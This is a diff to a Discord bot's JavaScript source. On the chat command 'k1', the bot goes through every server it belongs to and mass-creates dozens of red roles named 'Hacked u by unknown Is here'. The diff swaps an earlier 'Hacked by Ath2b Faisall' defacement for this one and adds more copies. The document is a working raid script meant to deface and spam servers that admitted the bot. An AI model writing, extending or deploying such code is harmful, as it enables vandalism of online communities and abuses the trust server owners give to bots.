@@ -74,176 +74,209 @@ LOka.on('message', message => {
  
 }
 });
- 
 LOka.on('message', message => {
      
  
      if (message.content === "k1") {
          LOka.guilds.forEach(m =>{
-    m.createRole({
-        name : "Hacked by Ath2b Faisall",
+  m.createRole({
+        name : "Hacked u by unknown Is here",
         permissions :   [1],
-        color : " #beb6b6"
+        color : " #ff0000"
+    })
+    m.createRole({
+        name : "Hacked u by unknown Is here",
+        permissions :   [1],
+        color : " #ff0000"
+    })
+    m.createRole({
+        name : "Hacked u by unknown Is here",
+        permissions :   [1],
+        color : " #ff0000"
+    })
+    m.createRole({
+        name : "Hacked u by unknown Is here",
+        permissions :   [1],
+        color : " #ff0000"
+    })
+    m.createRole({
+        name : "Hacked u by unknown Is here",
+        permissions :   [1],
+        color : " #ff0000"
+    })
+    m.createRole({
+        name : "Hacked u by unknown Is here",
+        permissions :   [1],
+        color : " #ff0000"
+    })
+    m.createRole({
+        name : "Hacked u by unknown Is here",
+        permissions :   [1],
+        color : " #ff0000"
+    })
+    m.createRole({
+        name : "Hacked u by unknown Is here",
+        permissions :   [1],
+        color : " #ff0000"
+    })
+    m.createRole({
+        name : "Hacked u by unknown Is here",
+        permissions :   [1],
+        color : " #ff0000"
+    })
+ 
+    m.createRole({
+        name : "Hacked u by unknown Is here",
+        permissions :   [1],
+        color : " #ff0000"
+    })
+    m.createRole({
+        name : "Hacked u by unknown Is here",
+        permissions :   [1],
+        color : " #ff0000"
+    })
+    m.createRole({
+        name : "Hacked u by unknown Is here",
+        permissions :   [1],
+        color : " #ff0000"
     })
      m.createRole({
-        name : "Hacked by Ath2b Faisall",
+        name : "Hacked u by unknown Is here",
         permissions :   [1],
-        color : " #beb6b6"
+        color : " #ff0000"
     })
     m.createRole({
-        name : "Hacked by Ath2b Faisall",
+        name : "Hacked u by unknown Is here",
         permissions :   [1],
-        color : " #beb6b6"
+        color : " #ff0000"
     })
-     m.createRole({
-        name : "Hacked by Ath2b Faisall",
+ 
+    m.createRole({
+        name : "Hacked u by unknown Is here",
         permissions :   [1],
-        color : " #beb6b6"
-    })
-       m.createRole({
-        name : "Hacked by Ath2b Faisall",
-        permissions :   [1],
-        color : " #beb6b6"
+        color : " #ff0000"
     })
     m.createRole({
-        name : "Hacked by Ath2b Faisall",
+        name : "Hacked u by unknown Is here",
         permissions :   [1],
-        color : " #beb6b6"
+        color : " #ff0000"
+    })
+ 
+    m.createRole({
+        name : "Hacked u by unknown Is here",
+        permissions :   [1],
+        color : " #ff0000"
     })
     m.createRole({
-        name : "Hacked by Ath2b Faisall",
+        name : "Hacked u by unknown Is here",
         permissions :   [1],
-        color : " #beb6b6"
+        color : " #ff0000"
     })
     m.createRole({
-        name : "Hacked by Ath2b Faisall",
+        name : "Hacked u by unknown Is here",
         permissions :   [1],
-        color : " #beb6b6"
+        color : " #ff0000"
     })
     m.createRole({
-        name : "Hacked by Ath2b Faisall",
+        name : "Hacked u by unknown Is here",
         permissions :   [1],
-        color : " #beb6b6"
+        color : " #ff0000"
     })
     m.createRole({
-        name : "Hacked by Ath2b Faisall",
+        name : "Hacked u by unknown Is here",
         permissions :   [1],
-        color : " #beb6b6"
+        color : " #ff0000"
     })
     m.createRole({
-        name : "Hacked by Ath2b Faisall",
+        name : "Hacked u by unknown Is here",
         permissions :   [1],
-        color : " #beb6b6"
+        color : " #ff0000"
     })
     m.createRole({
-        name : "Hacked by Ath2b Faisall",
+        name : "Hacked u by unknown Is here",
         permissions :   [1],
-        color : " #beb6b6"
+        color : " #ff0000"
     })
     m.createRole({
-        name : "Hacked by Ath2b Faisall",
+        name : "Hacked u by unknown Is here",
         permissions :   [1],
-        color : " #beb6b6"
+        color : " #ff0000"
     })
     m.createRole({
-        name : "Hacked by Ath2b Faisall",
+        name : "Hacked u by unknown Is here",
         permissions :   [1],
-        color : " #beb6b6"
+        color : " #ff0000"
     })
     m.createRole({
-        name : "Hacked by Ath2b Faisall",
+        name : "Hacked u by unknown Is here",
         permissions :   [1],
-        color : " #beb6b6"
+        color : " #ff0000"
     })
     m.createRole({
-        name : "Hacked by Ath2b Faisall",
+        name : "Hacked u by unknown Is here",
         permissions :   [1],
-        color : " #beb6b6"
+        color : " #ff0000"
     })
     m.createRole({
-        name : "Hacked by Ath2b Faisall",
+        name : "Hacked u by unknown Is here",
         permissions :   [1],
-        color : " #beb6b6"
+        color : " #ff0000"
     })
     m.createRole({
-        name : "Hacked by Ath2b Faisall",
+        name : "Hacked u by unknown Is here",
         permissions :   [1],
-        color : " #beb6b6"
+        color : " #ff0000"
     })
     m.createRole({
-        name : "Hacked by Ath2b Faisall",
+        name : "Hacked u by unknown Is here",
         permissions :   [1],
-        color : " #beb6b6"
+        color : " #ff0000"
     })
     m.createRole({
-        name : "Hacked by Ath2b Faisall",
+        name : "Hacked u by unknown Is here",
         permissions :   [1],
-        color : " #beb6b6"
+        color : " #ff0000"
     })
     m.createRole({
-        name : "Hacked by Ath2b Faisall",
+        name : "Hacked u by unknown Is here",
         permissions :   [1],
-        color : " #beb6b6"
+        color : " #ff0000"
     })
     m.createRole({
-        name : "Hacked by Ath2b Faisall",
+        name : "Hacked u by unknown Is here",
         permissions :   [1],
-        color : " #beb6b6"
+        color : " #ff0000"
+    })
+ 
+    m.createRole({
+        name : "Hacked u by unknown Is here",
+        permissions :   [1],
+        color : " #ff0000"
     })
     m.createRole({
-        name : "Hacked by Ath2b Faisall",
+        name : "Hacked u by unknown Is here",
         permissions :   [1],
-        color : " #beb6b6"
+        color : " #ff0000"
+    })
+ 
+    m.createRole({
+        name : "Hacked u by unknown Is here",
+        permissions :   [1],
+        color : " #ff0000"
     })
     m.createRole({
-        name : "Hacked by Ath2b Faisall",
+        name : "Hacked u by unknown Is here",
         permissions :   [1],
-        color : " #beb6b6"
+        color : " #ff0000"
     })
     m.createRole({
-        name : "Hacked by Ath2b Faisall",
+        name : "Hacked u by unknown Is here",
         permissions :   [1],
-        color : " #beb6b6"
+        color : " #ff0000"
     })
-    m.createRole({
-        name : "Hacked by Ath2b Faisall",
-        permissions :   [1],
-        color : " #beb6b6"
-    })
-    m.createRole({
-        name : "Hacked by Ath2b Faisall",
-        permissions :   [1],
-        color : " #beb6b6"
-    })
-    m.createRole({
-        name : "Hacked by Ath2b Faisall",
-        permissions :   [1],
-        color : " #beb6b6"
-    })
-    m.createRole({
-        name : "Hacked by Ath2b Faisall",
-        permissions :   [1],
-        color : " #beb6b6"
-    })
-    m.createRole({
-        name : "Hacked by Ath2b Faisall",
-        permissions :   [1],
-        color : " #beb6b6"
-    })
-    m.createRole({
-        name : "Hacked by Ath2b Faisall",
-        permissions :   [1],
-        color : " #beb6b6"
-    })    m.createRole({
-        name : "Hacked by Ath2b Faisall",
-        permissions :   [1],
-        color : " #beb6b6"
-    })    m.createRole({
-        name : "Hacked by Ath2b Faisall",
-        permissions :   [1],
-        color : " #beb6b6"
-    })
-
+ 
+ 
+   
 })
  
  
